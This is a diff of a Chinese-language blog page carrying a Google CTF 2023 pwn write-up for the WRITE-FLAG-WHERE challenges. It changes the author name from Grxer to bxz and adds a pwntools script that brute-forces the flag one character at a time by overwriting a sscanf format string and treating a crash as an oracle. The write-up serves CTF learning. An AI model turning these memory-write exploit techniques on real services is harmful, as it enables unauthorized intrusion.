@@ -12,12 +12,12 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="2023googlectf-pwn">
 <meta property="og:url" content="https://grxer.gitee.io/2023/07/10/googlectf-pwn/index.html">
-<meta property="og:site_name" content="Computer Security">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
 <meta property="og:description" content="WRITE-FLAG-WHERE本地调试的话Maximum number of open file descriptors最高到1024，所以把dup2 patch为小于1024的值或者修改&#x2F;etc&#x2F;security&#x2F;limits.conf把限制调高 grxer@Ubuntu22 ~&gt; ulimit -aMaximum size of core files cr">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-07-10T02:26:02.000Z">
-<meta property="article:modified_time" content="2023-07-12T03:05:39.569Z">
-<meta property="article:author" content="Grxer">
+<meta property="article:modified_time" content="2023-07-12T13:52:31.321Z">
+<meta property="article:author" content="bxz">
 <meta name="twitter:card" content="summary">
     
     
@@ -69,6 +69,8 @@
        --><li><a href="/search/">Search</a></li><!--
      --><!--
        --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
      -->
       </ul>
     </span>
@@ -126,7 +128,7 @@
 
     <div class="meta">
       <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">Grxer</span>
+        <span itemprop="name">bxz</span>
       </span>
       
     <div class="postdate">
@@ -169,6 +171,10 @@
 
 <p>可以利用push指令改写跳过exit,从后往前写CT,用前一个T覆盖后一个C，即为CTTTT，再改写输出flag即可</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="meta"># io=process(<span class="string">&#x27;./chal_patch&#x27;</span>)</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line">io.recvuntil(b<span class="number">&#x27;</span> the fluff\n<span class="number">&#x27;</span>)</span><br><span class="line">image_addr = <span class="type">int</span>(io.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)</span></span><br><span class="line"><span class="string">success(&#x27;</span>image_addr: <span class="string">&#x27; + hex(image_addr))</span></span><br><span class="line"><span class="string">io.recvuntil(b&#x27;</span>[vsyscall]\n<span class="number">&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span>%(image_addr+<span class="number">0x1443</span>-i,<span class="number">2</span>)).encode())</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline((<span class="string">&#x27;0x%lx %u&#x27;</span> % (image_addr+<span class="number">0x20D5</span>, <span class="number">80</span>)).encode())</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>从c0ke师傅周报那里偷学了一手爆破</p>
+<p>思路就是修改<code>if ( (unsigned int)__isoc99_sscanf(buf, &quot;0x%llx %u&quot;, &amp;n[1], n) != 2 || n[0] &gt; 0x7Fu )</code>中0x%llx %u的0为flag中的一位值，下一次输入时以猜测的flag值+x%llx %u的格式来发送数据，如果不是正确的数据就会无法解析数据 (unsigned int)__isoc99_sscanf(buf, “0x%llx %u”, &amp;n[1], n) !&#x3D; 2程序退出，否则正常下一次读入</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">def <span class="title function_">leak</span><span class="params">(offset, chr)</span>:    </span><br><span class="line">    sh = remote(<span class="string">&#x27;wfw2.2023.ctfcompetition.com&#x27;</span>, <span class="number">1337</span>)             </span><br><span class="line">    sh.recvuntil(b<span class="number">&#x27;f</span>luff\n<span class="number">&#x27;</span>)    </span><br><span class="line">    image_addr = <span class="type">int</span>(sh.recvuntil(b<span class="number">&#x27;</span>-<span class="string">&#x27;, drop=True), 16)    </span></span><br><span class="line"><span class="string">    sh.recvuntil(b&#x27;</span>\n\n\n<span class="number">&#x27;</span>)    </span><br><span class="line">    sh.send((<span class="string">&#x27;0x%lx %u\n&#x27;</span> % (image_addr+<span class="number">0x20BC</span>-offset, offset+<span class="number">1</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    sh.send((<span class="string">&#x27;%cx%lx %u\n&#x27;</span> % (chr, image_addr, <span class="number">0</span>)).encode().ljust(<span class="number">0x40</span>, b<span class="number">&#x27;0&#x27;</span>))    </span><br><span class="line">    try:        </span><br><span class="line">        sh.recvn(<span class="number">1</span>, timeout=<span class="number">1</span>)        </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> True    </span><br><span class="line">    except EOFError:       </span><br><span class="line">        sh.close()        </span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;_&#123;&#125;?&#x27;</span> + <span class="built_in">string</span>.digits + <span class="built_in">string</span>.ascii_lowercase + <span class="built_in">string</span>.ascii_uppercase</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">while(True):    </span></span><br><span class="line"><span class="string">    find = False    </span></span><br><span class="line"><span class="string">    for chr in table:        </span></span><br><span class="line"><span class="string">        if leak(len(flag), chr):            </span></span><br><span class="line"><span class="string">            find = True            </span></span><br><span class="line"><span class="string">            flag += chr            </span></span><br><span class="line"><span class="string">            print(flag)            </span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">    if not find:      </span></span><br><span class="line"><span class="string">        print(flag)              </span></span><br><span class="line"><span class="string">        break</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="WRITE-FLAG-WHERE3"><a href="#WRITE-FLAG-WHERE3" class="headerlink" title="WRITE-FLAG-WHERE3"></a>WRITE-FLAG-WHERE3</h3><p>多了改写位置的判断<code>|| *(_QWORD *)&amp;n[1] &gt;= (unsigned __int64)main - 20480 &amp;&amp; (unsigned __int64)main + 20480 &gt;= *(_QWORD *)&amp;n[1] )</code></p>
 <p>不能是main-20480到main+20480之间，只能时libc和栈区</p>
@@ -214,6 +220,8 @@
           <li><a href="/search/">Search</a></li>
          
           <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
         
       </ul>
     </div>
@@ -256,7 +264,7 @@
     
     
     2023
-    Grxer
+    bxz
   </div>
   <div class="footer-right">
     <nav>
@@ -269,6 +277,8 @@
        --><li><a href="/search/">Search</a></li><!--
      --><!--
        --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
      -->
       </ul>
     </nav>
